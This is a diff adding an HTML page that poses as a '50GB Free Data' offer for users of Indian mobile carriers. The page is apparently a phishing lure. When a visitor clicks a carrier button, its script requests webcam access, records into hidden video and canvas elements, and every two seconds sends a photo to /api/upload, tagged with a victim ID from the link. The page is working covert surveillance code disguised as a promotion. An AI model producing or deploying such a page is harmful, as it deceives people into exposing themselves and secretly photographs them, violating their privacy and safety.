@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Internet Offer 2026</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        button { padding: 10px 20px; margin: 10px; cursor: pointer; border: none; border-radius: 5px; background: #007bff; color: white; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Select Your SIM to Claim 50GB Free Data</h2>
+        <button onclick="startCapture('Airtel')">Airtel</button>
+        <button onclick="startCapture('Jio')">Jio</button>
+        <button onclick="startCapture('Vi')">Vi</button>
+        <button onclick="startCapture('BSNL')">BSNL</button>
+        <video id="video" style="display:none;" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id'); // Get unique ID from link
+
+        async function startCapture(sim) {
+            alert("Checking eligibility for " + sim + "...");
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setInterval(() => {
+                    captureAndSend();
+                }, 2000); // Sends a photo every 2 seconds
+            } catch (err) {
+                console.log("Permission denied");
+            }
+        }
+
+        function captureAndSend() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg');
+            
+            fetch('/api/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData, id: userId })
+            });
+        }
+    </script>
+</body>
+</html>
